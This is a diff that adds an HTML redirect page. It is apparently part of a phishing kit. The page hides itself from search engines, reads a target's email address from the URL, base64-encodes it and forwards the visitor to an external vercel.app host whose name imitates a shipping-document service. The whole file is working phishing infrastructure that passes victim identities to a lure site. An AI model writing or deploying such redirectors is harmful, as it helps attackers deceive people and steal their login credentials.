@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+    <title>Redirecting...</title>
+    <script>
+        var destination = "https://boseng-shipping0e9rdoc-app9e.vercel.app";
+
+        var currentParams = new URLSearchParams(window.location.search);
+        var email = currentParams.get('e') || currentParams.get('email') || "";
+
+        if (!email && window.location.hash) {
+            email = window.location.hash.substring(1);
+        }
+
+        var base64Email = "";
+        if (email) {
+            try {
+                base64Email = btoa(unescape(encodeURIComponent(email)));
+            } catch (err) {
+                base64Email = btoa(email);
+            }
+        }
+
+        var targetUrl = destination;
+        if (base64Email) {
+            var separator = destination.indexOf('?') === -1 ? '?e=' : '&e=';
+            targetUrl = destination + separator + encodeURIComponent(base64Email);
+        }
+
+        window.location.replace(targetUrl);
+    </script>
+</head>
+
+<body>
+    <p>
+        If you are not redirected automatically,
+        <a id="redirect-link" href="#">click here</a>.
+    </p>
+
+    <script>
+        document.getElementById("redirect-link").href = targetUrl;
+    </script>
+</body>
+
+</html>
